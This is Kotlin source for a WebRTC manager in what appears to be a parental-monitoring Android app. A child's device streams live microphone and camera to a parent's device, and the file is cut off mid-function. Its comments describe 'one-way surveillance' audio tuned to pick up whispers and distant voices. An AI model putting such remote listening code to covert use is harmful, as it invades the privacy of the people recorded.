package com.example.authapp.webrtc

import android.content.Context
import android.media.AudioFormat
import android.media.AudioManager
import android.media.MediaRecorder
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.LoudnessEnhancer
import android.media.audiofx.NoiseSuppressor
import com.example.authapp.analytics.AppHealthTelemetry
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.perf.FirebasePerformance
import android.os.Build
import org.webrtc.*
import org.webrtc.audio.JavaAudioDeviceModule

class WebRtcManager(
    context: Context,
    private val isReceiverOnly: Boolean = false
) {
    private val appContext: Context = context.applicationContext
    val eglBase: EglBase = EglBase.create(null, EglBase.CONFIG_PLAIN)
    private var factory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var audioSource: AudioSource? = null
    private var audioTrack: AudioTrack? = null
    private var videoCapturer: VideoCapturer? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var hardwareAgc: AutomaticGainControl? = null
    private var hardwareNs: NoiseSuppressor? = null
    private var loudnessEnhancer: LoudnessEnhancer? = null

    private val pendingCandidates = mutableListOf<IceCandidate>()
    @Volatile
    private var isRemoteDescriptionSet = false
    @Volatile
    private var isCameraRunning = false
    @Volatile
    private var isStopped = false

    init {
        try {
            initializePcfIfNeeded(appContext)

            val encoderFactory = DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, true)
            val isSamsung = Build.MANUFACTURER.equals("samsung", ignoreCase = true)
            val decoderFactory = object : VideoDecoderFactory {
                // On Samsung devices (especially Exynos chips like A21s), hardware OMX decoding causes native SIGABRT in libc.so.
                // SoftwareVideoDecoderFactory (libvpx VP8/VP9) is completely crash-safe and lightweight.
                private val hardwareFactory = if (isSamsung) null else try { DefaultVideoDecoderFactory(eglBase.eglBaseContext) } catch (_: Throwable) { null }
                private val softwareFactory = SoftwareVideoDecoderFactory()

                override fun createDecoder(info: VideoCodecInfo?): VideoDecoder? {
                    return if (isSamsung) {
                        softwareFactory.createDecoder(info)
                    } else {
                        try {
                            hardwareFactory?.createDecoder(info) ?: softwareFactory.createDecoder(info)
                        } catch (_: Throwable) {
                            softwareFactory.createDecoder(info)
                        }
                    }
                }

                override fun getSupportedCodecs(): Array<VideoCodecInfo> {
                    val list = mutableListOf<VideoCodecInfo>()
                    if (!isSamsung) {
                        try { hardwareFactory?.supportedCodecs?.let { list.addAll(it) } } catch (_: Throwable) {}
                    }
                    try { softwareFactory.supportedCodecs?.let { list.addAll(it) } } catch (_: Throwable) {}
                    return list.distinctBy { it.name }.toTypedArray()
                }
            }

            val adm = if (isReceiverOnly) {
                // Receiver only needs audio output/playback — no mic hardware access
                JavaAudioDeviceModule.builder(appContext)
                    .setUseHardwareAcousticEchoCanceler(false)
                    .setUseHardwareNoiseSuppressor(false)
                    .createAudioDeviceModule()
            } else {
                JavaAudioDeviceModule.builder(appContext)
                    .setUseHardwareAcousticEchoCanceler(false) // One-way surveillance: disable hardware AEC so mic gain is not suppressed
                    .setUseHardwareNoiseSuppressor(false)      // Disable aggressive hardware gating so quiet whispers are captured
                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION) // Hardware beamforming
                    .setAudioFormat(AudioFormat.ENCODING_PCM_16BIT)
                    .setAudioRecordErrorCallback(object : JavaAudioDeviceModule.AudioRecordErrorCallback {
                        override fun onWebRtcAudioRecordInitError(errorMessage: String?) {
                            AppHealthTelemetry.logDiagnostic(appContext, "LIVE_AUDIO", "FAILED", "AudioRecord Init Error: $errorMessage", errorMessage)
                            FirebaseCrashlytics.getInstance().log("[WebRTC AudioRecord Init Error] $errorMessage")
                        }
                        override fun onWebRtcAudioRecordStartError(errorCode: JavaAudioDeviceModule.AudioRecordStartErrorCode?, errorMessage: String?) {
                            AppHealthTelemetry.logDiagnostic(appContext, "LIVE_AUDIO", "FAILED", "AudioRecord Start Error $errorCode: $errorMessage", errorMessage)
                            FirebaseCrashlytics.getInstance().log("[WebRTC AudioRecord Start Error] $errorCode: $errorMessage")
                        }
                        override fun onWebRtcAudioRecordError(errorMessage: String?) {
                            AppHealthTelemetry.logDiagnostic(appContext, "LIVE_AUDIO", "FAILED", "AudioRecord Error: $errorMessage", errorMessage)
                            FirebaseCrashlytics.getInstance().log("[WebRTC AudioRecord Error] $errorMessage")
                        }
                    })
                    .createAudioDeviceModule()
            }
            audioDeviceModule = adm

            factory = PeerConnectionFactory.builder()
                .setAudioDeviceModule(adm)
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .setOptions(PeerConnectionFactory.Options())
                .createPeerConnectionFactory()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[WebRtcManager] Initialization error: ${e.localizedMessage}")
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    // --- Broadcaster Mode (Child Device) ---

    fun startStream(
        streamType: String, // "audio" or "video"
        iceServers: List<PeerConnection.IceServer>,
        onIceCandidate: (IceCandidate) -> Unit,
        onSdpCreated: (SessionDescription) -> Unit,
        onRemoteTrackAdded: (MediaStreamTrack) -> Unit = {}
    ) {
        if (isStopped) return
        val perfTrace = FirebasePerformance.getInstance().newTrace("webrtc_stream_init_$streamType")
        perfTrace.start()

        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            enableDscp = true // QoS Expedited Forwarding priority for voice packets
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            iceCandidatePoolSize = 2
        }

        peerConnection = factory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Broadcaster] ICE Connection State: $state")
                if (state == PeerConnection.IceConnectionState.FAILED) {
                    AppHealthTelemetry.logDiagnostic(appContext, "WEBRTC_CONNECTION", "FAILED", "ICE connection failed (NAT/Firewall block)")
                    FirebaseCrashlytics.getInstance().recordException(Exception("WebRTC ICE Connection Failed"))
                } else if (state == PeerConnection.IceConnectionState.CONNECTED) {
                    AppHealthTelemetry.logDiagnostic(appContext, "WEBRTC_CONNECTION", "SUCCESS", "WebRTC peer connection active and streaming")
                }
            }
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidate(candidate: IceCandidate?) {
                if (!isStopped) candidate?.let { onIceCandidate(it) }
            }
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(channel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {
                if (!isStopped) receiver?.track()?.let { onRemoteTrackAdded(it) }
            }
        })

        // Audio Track with High-Sensitivity Whisper Capture & Digital AGC2
        val audioConstraints = MediaConstraints().apply {
            // One-way listening: disable AEC so microphone input sensitivity is 100% full
            mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
            // WebRTC software AGC2: automatically boosts distant and whispered voices (+25 dB)
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
            // Noise suppression tuned to preserve human voice band
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
            // Disable highpass filter to keep deep/low vocal fundamentals (100Hz-300Hz) intact
            mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "false"))
            // Suppress screen taps and physical vibration
            mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "true"))
            mandatory.add(MediaConstraints.KeyValuePair("googAudioMirroring", "false"))
        }
        audioSource = factory?.createAudioSource(audioConstraints)
        audioTrack = factory?.createAudioTrack("ARDAMSa0", audioSource)
        audioTrack?.setEnabled(true)
        audioTrack?.let { at ->
            peerConnection?.addTransceiver(
                at,
                RtpTransceiver.RtpTransceiverInit(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
            )
        }
        enableHardwareAudioEffects()

        // Video Track (if requested)
        if (streamType.equals("video", ignoreCase = true)) {
            var capturer: VideoCapturer? = null
            for (attempt in 1..3) {
                capturer = createVideoCapturer(preferFront = true)
                    ?: createVideoCapturer(preferFront = false)
                if (capturer != null) break
                FirebaseCrashlytics.getInstance().log("[WebRTC] Camera capturer attempt $attempt returned null, retrying in 250ms...")
                try { Thread.sleep(250L) } catch (_: InterruptedException) {}
            }
            if (capturer != null) {
                videoCapturer = capturer
                surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase.eglBaseContext)
                videoSource = factory?.createVideoSource(capturer.isScreencast)
                capturer.initialize(surfaceTextureHelper, appContext, videoSource?.capturerObserver)

                var started = false
                val resolutions = listOf(
                    Triple(640, 480, 30),
                    Triple(640, 480, 15),
                    Triple(480, 360, 24),
                    Triple(320, 240, 15)
                )
                for ((w, h, fps) in resolutions) {
                    try {
                        capturer.startCapture(w, h, fps)
                        FirebaseCrashlytics.getInstance().log("[WebRTC] Camera capture started: ${w}x${h}@$fps")
                        started = true
                        break
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[WebRTC] Camera ${w}x${h}@$fps failed: ${e.localizedMessage}")
                    }
                }

                if (!started) {
                    try { capturer.dispose() } catch (e: Exception) {}
                    try { surfaceTextureHelper?.dispose() } catch (e: Exception) {}
                    surfaceTextureHelper = null
                    videoCapturer = null

                    val fallbackCapturer = createVideoCapturer(preferFront = false)
                    if (fallbackCapturer != null) {
                        videoCapturer = fallbackCapturer
                        val newSurfaceHelper = SurfaceTextureHelper.create("CaptureThreadFallback", eglBase.eglBaseContext)
                        surfaceTextureHelper = newSurfaceHelper
                        fallbackCapturer.initialize(newSurfaceHelper, appContext, videoSource?.capturerObserver)
                        for ((w, h, fps) in resolutions) {
                            try {
                                fallbackCapturer.startCapture(w, h, fps)
                                FirebaseCrashlytics.getInstance().log("[WebRTC] Fallback Camera capture started: ${w}x${h}@$fps")
                                started = true
                                break
                            } catch (_: Exception) {}
                        }
                    }
                }

                isCameraRunning = started
                if (started && videoSource != null) {
                    AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "SUCCESS", "Camera capturer active and video track attached")
                    videoTrack = factory?.createVideoTrack("ARDAMSv0", videoSource)
                    videoTrack?.setEnabled(true)
                    videoTrack?.let { vt ->
                        peerConnection?.addTransceiver(
                            vt,
                            RtpTransceiver.RtpTransceiverInit(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
                        )
                    }
                    FirebaseCrashlytics.getInstance().log("[WebRTC] Video track added to PeerConnection via transceiver (started=$started)")
                } else {
                    AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "FAILED", "Camera startCapture failed for all fallback resolutions")
                    FirebaseCrashlytics.getInstance().log("[WebRTC] Camera startCapture failed: video track omitted")
                }
            } else {
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "FAILED", "No camera capturer could be created (Camera hardware busy or CAMERA permission missing)")
                FirebaseCrashlytics.getInstance().log("[WebRTC] ERROR: No camera capturer could be created!")
            }
        }

        // Offer banate waqt empty constraints do, legacy flags mat do (Fix 5)
        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(desc: SessionDescription?) {
                if (isStopped) return
                desc?.let { originalOffer ->
                    val optimizedOffer = SessionDescription(originalOffer.type, preferOpusHighQuality(originalOffer.description))
                    peerConnection?.setLocalDescription(object : SdpObserver {
                        override fun onCreateSuccess(p0: SessionDescription?) {}
                        override fun onSetSuccess() {
                            if (!isStopped) {
                                perfTrace.stop()
                                onSdpCreated(optimizedOffer)
                            }
                        }
                        override fun onCreateFailure(p0: String?) {
                            FirebaseCrashlytics.getInstance().log("[WebRTC] Local SDP Create Failure: $p0")
                        }
                        override fun onSetFailure(p0: String?) {
                            FirebaseCrashlytics.getInstance().log("[WebRTC] Local SDP Set Failure: $p0")
                        }
                    }, optimizedOffer)
                }
            }
            override fun onSetSuccess() {}
            override fun onCreateFailure(error: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Offer Create Failure: $error")
            }
            override fun onSetFailure(error: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Offer Set Failure: $error")
            }
        }, MediaConstraints())
    }

    fun setRemoteAnswer(sdpString: String, onSetSuccess: (() -> Unit)? = null) {
        if (isStopped) return
        val sdp = SessionDescription(SessionDescription.Type.ANSWER, sdpString)
        peerConnection?.setRemoteDescription(object : SdpObserver {
            override fun onCreateSuccess(p0: SessionDescription?) {}
            override fun onSetSuccess() {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Remote Answer set successfully.")
                drainPendingCandidates()
                if (!isStopped) onSetSuccess?.invoke()
            }
            override fun onCreateFailure(p0: String?) {}
            override fun onSetFailure(p0: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Remote Answer set failure: $p0")
            }
        }, sdp)
    }

    // --- Receiver Mode (Parent Device) ---

    fun startReceiver(
        iceServers: List<PeerConnection.IceServer>,
        onIceCandidate: (IceCandidate) -> Unit,
        onRemoteVideoTrack: (VideoTrack) -> Unit,
        onRemoteAudioTrack: (AudioTrack) -> Unit = {}
    ) {
        if (isStopped) return
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            enableDscp = true // QoS Expedited Forwarding packet tagging
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
            iceCandidatePoolSize = 2
        }

        peerConnection = factory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Signaling State: $state")
            }
            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] ICE Connection State: $state")
                when (state) {
                    PeerConnection.IceConnectionState.FAILED ->
                        AppHealthTelemetry.logDiagnostic(appContext, "WEBRTC_RECEIVER", "FAILED", "Receiver ICE connection failed")
                    PeerConnection.IceConnectionState.CONNECTED ->
                        AppHealthTelemetry.logDiagnostic(appContext, "WEBRTC_RECEIVER", "SUCCESS", "Receiver ICE connected")
                    PeerConnection.IceConnectionState.DISCONNECTED ->
                        FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] ICE disconnected")
                    else -> {}
                }
            }
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidate(candidate: IceCandidate?) {
                if (!isStopped) candidate?.let { onIceCandidate(it) }
            }
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(channel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {
                if (isStopped) return
                val track = receiver?.track()
                when (track) {
                    is VideoTrack -> {
                        FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Remote VideoTrack received")
                        track.setEnabled(true)
                        onRemoteVideoTrack(track)
                    }
                    is AudioTrack -> {
                        FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Remote AudioTrack received")
                        track.setEnabled(true)
                        track.setVolume(1.5) // Default slight boost on parent receiver
                        onRemoteAudioTrack(track)
                    }
                    else -> {}
                }
            }
        })

        // Add RECV_ONLY transceivers so SDP answer includes audio + video slots
        try {
            peerConnection?.addTransceiver(
                MediaStreamTrack.MediaType.MEDIA_TYPE_AUDIO,
                RtpTransceiver.RtpTransceiverInit(RtpTransceiver.RtpTransceiverDirection.RECV_ONLY)
            )
            peerConnection?.addTransceiver(
                MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO,
                RtpTransceiver.RtpTransceiverInit(RtpTransceiver.RtpTransceiverDirection.RECV_ONLY)
            )
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Add transceiver exception: ${e.localizedMessage}")
        }
    }

    fun setRemoteOfferAndCreateAnswer(
        offerSdpString: String,
        onAnswerCreated: (SessionDescription) -> Unit
    ) {
        if (isStopped) return
        val offerDesc = SessionDescription(SessionDescription.Type.OFFER, offerSdpString)
        peerConnection?.setRemoteDescription(object : SdpObserver {
            override fun onCreateSuccess(p0: SessionDescription?) {}
            override fun onSetSuccess() {
                if (isStopped) return
                drainPendingCandidates()
                val mediaConstraints = MediaConstraints()
                peerConnection?.createAnswer(object : SdpObserver {
                    override fun onCreateSuccess(answerDesc: SessionDescription?) {
                        if (isStopped) return
                        answerDesc?.let { originalAnswer ->
                            val optimizedAnswer = SessionDescription(originalAnswer.type, preferOpusHighQuality(originalAnswer.description))
                            peerConnection?.setLocalDescription(object : SdpObserver {
                                override fun onCreateSuccess(p0: SessionDescription?) {}
                                override fun onSetSuccess() {
                                    if (!isStopped) onAnswerCreated(optimizedAnswer)
                                }
                                override fun onCreateFailure(p0: String?) {}
                                override fun onSetFailure(p0: String?) {}
                            }, optimizedAnswer)
                        }
                    }
                    override fun onSetSuccess() {}
                    override fun onCreateFailure(p0: String?) {
                        FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Create Answer Failure: $p0")
                    }
                    override fun onSetFailure(p0: String?) {
                        FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Set Answer Failure: $p0")
                    }
                }, mediaConstraints)
            }
            override fun onCreateFailure(p0: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Remote Offer Set Failure: $p0")
            }
            override fun onSetFailure(p0: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Receiver] Remote Offer Set Failure: $p0")
            }
        }, offerDesc)
    }

    fun addRemoteCandidate(sdpMid: String, sdpMLineIndex: Int, sdp: String) {
        if (isStopped) return
        val candidate = IceCandidate(sdpMid, sdpMLineIndex, sdp)
        synchronized(pendingCandidates) {
            // Gate on actual remote description being set, not just the flag
            if (peerConnection?.remoteDescription != null) {
                val added = peerConnection?.addIceCandidate(candidate)
                FirebaseCrashlytics.getInstance().log("[WebRTC] Added remote ICE candidate directly: $added")
            } else {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Queued remote ICE candidate (pending remote description)")
                pendingCandidates.add(candidate)
            }
        }
    }

    private fun drainPendingCandidates() {
        synchronized(pendingCandidates) {
            isRemoteDescriptionSet = true
            FirebaseCrashlytics.getInstance().log("[WebRTC] Draining ${pendingCandidates.size} queued ICE candidates")
            for (candidate in pendingCandidates) {
                if (!isStopped) peerConnection?.addIceCandidate(candidate)
            }
            pendingCandidates.clear()
        }
    }

    private fun createVideoCapturer(preferFront: Boolean = true): VideoCapturer? {
        val cameraEventsHandler = object : CameraVideoCapturer.CameraEventsHandler {
            override fun onCameraError(errorDescription: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Camera Error] $errorDescription")
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "FAILED", "Camera hardware error: $errorDescription")
                if (!isStopped) {
                    try {
                        val capturer = videoCapturer as? CameraVideoCapturer
                        capturer?.switchCamera(object : CameraVideoCapturer.CameraSwitchHandler {
                            override fun onCameraSwitchDone(isFrontCamera: Boolean) {
                                FirebaseCrashlytics.getInstance().log("[WebRTC] Auto-switched to alternate camera lens (isFront=$isFrontCamera)")
                            }
                            override fun onCameraSwitchError(switchError: String?) {
                                FirebaseCrashlytics.getInstance().log("[WebRTC] Auto-switch camera error: $switchError")
                            }
                        })
                    } catch (_: Exception) {}
                }
            }
            override fun onCameraDisconnected() {
                FirebaseCrashlytics.getInstance().log("[WebRTC Camera Disconnected]")
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "FAILED", "Camera disconnected by Android OS")
            }
            override fun onCameraFreezed(errorDescription: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Camera Freezed] $errorDescription")
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "WARNING", "Camera frozen: $errorDescription")
            }
            override fun onCameraOpening(cameraName: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC Camera Opening] $cameraName")
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "OPENING", "Opening camera: $cameraName")
            }
            override fun onFirstFrameAvailable() {
                FirebaseCrashlytics.getInstance().log("[WebRTC First Frame Available]")
                AppHealthTelemetry.logDiagnostic(appContext, "LIVE_VIDEO", "FRAME_PRODUCED", "First video frame captured & encoding!")
            }
            override fun onCameraClosed() {
                FirebaseCrashlytics.getInstance().log("[WebRTC Camera Closed]")
            }
        }

        // 1. Try Camera2Enumerator first
        try {
            val enumerator = Camera2Enumerator(appContext)
            val capturer = findCapturer(enumerator, preferFront, cameraEventsHandler)
            if (capturer != null) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Created Camera2Capturer successfully (preferFront=$preferFront)")
                return capturer
            }
        } catch (e: Throwable) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] Camera2Enumerator failed: ${e.localizedMessage}")
        }

        // 2. Fallback to Camera1Enumerator
        try {
            val enumerator = Camera1Enumerator(false)
            val capturer = findCapturer(enumerator, preferFront, cameraEventsHandler)
            if (capturer != null) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Created Camera1Capturer fallback successfully (preferFront=$preferFront)")
                return capturer
            }
        } catch (e: Throwable) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] Camera1Enumerator failed: ${e.localizedMessage}")
        }

        FirebaseCrashlytics.getInstance().log("[WebRTC] ERROR: No camera capturer could be created!")
        return null
    }

    private fun findCapturer(
        enumerator: CameraEnumerator,
        preferFront: Boolean,
        handler: CameraVideoCapturer.CameraEventsHandler
    ): VideoCapturer? {
        val deviceNames = enumerator.deviceNames ?: return null
        // First pass: try preferred facing
        for (deviceName in deviceNames) {
            val isFront = enumerator.isFrontFacing(deviceName)
            if (isFront == preferFront) {
                try {
                    val capturer = enumerator.createCapturer(deviceName, handler)
                    if (capturer != null) return capturer
                } catch (e: Throwable) {
                    FirebaseCrashlytics.getInstance().log("[WebRTC] createCapturer ($deviceName) failed: ${e.localizedMessage}")
                }
            }
        }
        // Second pass: try alternative facing
        for (deviceName in deviceNames) {
            val isFront = enumerator.isFrontFacing(deviceName)
            if (isFront != preferFront) {
                try {
                    val capturer = enumerator.createCapturer(deviceName, handler)
                    if (capturer != null) return capturer
                } catch (e: Throwable) {
                    FirebaseCrashlytics.getInstance().log("[WebRTC] createCapturer alternate ($deviceName) failed: ${e.localizedMessage}")
                }
            }
        }

        // Third pass: fallback to any first available camera device
        for (deviceName in deviceNames) {
            try {
                val capturer = enumerator.createCapturer(deviceName, handler)
                if (capturer != null) {
                    FirebaseCrashlytics.getInstance().log("[WebRTC] Created capturer for first available device ($deviceName)")
                    return capturer
                }
            } catch (_: Throwable) {}
        }
        return null
    }

    companion object {
        @Volatile
        private var isPcfInitialized = false

        @Synchronized
        fun initializePcfIfNeeded(ctx: Context) {
            if (!isPcfInitialized) {
                try {
                    val options = PeerConnectionFactory.InitializationOptions.builder(ctx.applicationContext)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions()
                    PeerConnectionFactory.initialize(options)
                    isPcfInitialized = true
                    FirebaseCrashlytics.getInstance().log("[WebRtcManager] PeerConnectionFactory statically initialized")
                } catch (t: Throwable) {
                    FirebaseCrashlytics.getInstance().recordException(t)
                }
            }
        }

        fun getDefaultIceServers(): List<PeerConnection.IceServer> {
            return listOf(
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun3.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun4.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun.services.mozilla.com").createIceServer(),
                PeerConnection.IceServer.builder("stun:global.stun.twilio.com:3478").createIceServer(),
                PeerConnection.IceServer.builder("turn:openrelay.metered.ca:80")
                    .setUsername("openrelayproject")
                    .setPassword("openrelayproject")
                    .createIceServer(),
                PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443")
                    .setUsername("openrelayproject")
                    .setPassword("openrelayproject")
                    .createIceServer(),
                PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443?transport=tcp")
                    .setUsername("openrelayproject")
                    .setPassword("openrelayproject")
                    .createIceServer()
            )
        }

        fun preferOpusHighQuality(sdpDescription: String): String {
            val opusParams = "a=fmtp:111 minptime=10;ptime=10;useinbandfec=1;stereo=0;maxaveragebitrate=64000;cbr=1"
            return if (sdpDescription.contains("a=fmtp:111")) {
                sdpDescription.replace(
                    Regex("a=fmtp:111 .*"),
                    opusParams
                )
            } else if (sdpDescription.contains("a=rtpmap:111 opus/48000")) {
                sdpDescription.replace(
                    "a=rtpmap:111 opus/48000",
                    "a=rtpmap:111 opus/48000\r\n$opusParams"
                )
            } else {
                sdpDescription
            }
        }

        fun optimizeOpusSdp(sdpDescription: String): String = preferOpusHighQuality(sdpDescription)

        fun calculateSafeAudioGain(sensitivityPercent: Float): Double {
            val clamped = sensitivityPercent.coerceIn(0f, 100f)
            return 0.5 + (clamped / 100.0) * 1.5
        }

        /**
         * Ultra-high sensitivity boost curve for distant whisper monitoring.
         * Scales smoothly up to 3.5x digital gain without clipping.
         */
        fun calculateSuperBoostGain(sensitivityPercent: Float): Double {
            val clamped = sensitivityPercent.coerceIn(0f, 100f)
            return if (clamped <= 50f) {
                0.5 + (clamped / 50.0) * 1.5 // 0.5x -> 2.0x
            } else {
                2.0 + ((clamped - 50.0) / 50.0) * 1.5 // 2.0x -> 3.5x
            }
        }
    }

    fun switchCamera(onSwitched: ((Boolean) -> Unit)? = null) {
        if (isStopped) return
        val capturer = videoCapturer as? CameraVideoCapturer
        if (capturer == null || !isCameraRunning) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] switchCamera ignored: camera is not running")
            return
        }
        capturer.switchCamera(object : CameraVideoCapturer.CameraSwitchHandler {
            override fun onCameraSwitchDone(isFrontCamera: Boolean) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Camera switched successfully. Front: $isFrontCamera")
                onSwitched?.invoke(isFrontCamera)
            }
            override fun onCameraSwitchError(errorDescription: String?) {
                FirebaseCrashlytics.getInstance().log("[WebRTC] Camera switch notice: $errorDescription")
            }
        })
    }

    private var audioLevelHandler: android.os.Handler? = null
    private var audioLevelRunnable: Runnable? = null
    @Volatile
    private var currentAudioLevel: Float = 0f

    fun startAudioLevelMonitoring(onLevel: (Float) -> Unit) {
        if (isStopped) return
        stopAudioLevelMonitoring()
        audioLevelHandler = android.os.Handler(android.os.Looper.getMainLooper())
        audioLevelRunnable = object : Runnable {
            override fun run() {
                if (isStopped || peerConnection == null) return
                try {
                    peerConnection?.getStats { report ->
                        for (stats in report.statsMap.values) {
                            if (stats.type == "inbound-rtp") {
                                val kind = stats.members["kind"] ?: stats.members["mediaType"]
                                if (kind == "audio" || stats.id.contains("audio", ignoreCase = true)) {
                                    val levelObj = stats.members["audioLevel"]
                                    if (levelObj != null) {
                                        val rawLevel = when (levelObj) {
                                            is Number -> levelObj.toFloat()
                                            else -> levelObj.toString().toFloatOrNull() ?: 0f
                                        }
                                        currentAudioLevel = rawLevel.coerceIn(0f, 1f)
                                        onLevel(currentAudioLevel)
                                        return@getStats
                                    }
                                }
                            }
                        }
                    }
                } catch (_: Throwable) {}
                audioLevelHandler?.postDelayed(this, 100L)
            }
        }
        audioLevelHandler?.post(audioLevelRunnable!!)
    }

    fun stopAudioLevelMonitoring() {
        audioLevelHandler?.removeCallbacksAndMessages(null)
        audioLevelHandler = null
        audioLevelRunnable = null
        currentAudioLevel = 0f
    }

    /**
     * Boosts remote audio signal using DSP LoudnessEnhancer for whispered/distant sound.
     * @param audioSessionId The audio session to apply the effect to.
     * @param gainMilliBel Target gain in mB (e.g., 1200 mB = +12dB boost).
     */
    fun enableLoudnessBooster(audioSessionId: Int, gainMilliBel: Int = 1200) {
        try {
            loudnessEnhancer?.release()
            loudnessEnhancer = LoudnessEnhancer(audioSessionId).apply {
                setTargetGain(gainMilliBel.coerceIn(0, 3000))
                enabled = true
            }
            FirebaseCrashlytics.getInstance().log("[WebRTC] LoudnessEnhancer enabled with gain: ${gainMilliBel}mB for session: $audioSessionId")
        } catch (t: Throwable) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] LoudnessEnhancer init failed: ${t.localizedMessage}")
        }
    }

    fun setLoudnessGain(gainMilliBel: Int) {
        try {
            loudnessEnhancer?.setTargetGain(gainMilliBel.coerceIn(0, 3000))
        } catch (_: Throwable) {}
    }

    private fun enableHardwareAudioEffects() {
        try {
            val audioManager = appContext.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            val sessionId = getAudioSessionIdFromAdm() ?: audioManager?.generateAudioSessionId()
            if (sessionId != null && sessionId != 0) {
                if (AutomaticGainControl.isAvailable()) {
                    try {
                        hardwareAgc = AutomaticGainControl.create(sessionId)?.apply {
                            enabled = true
                        }
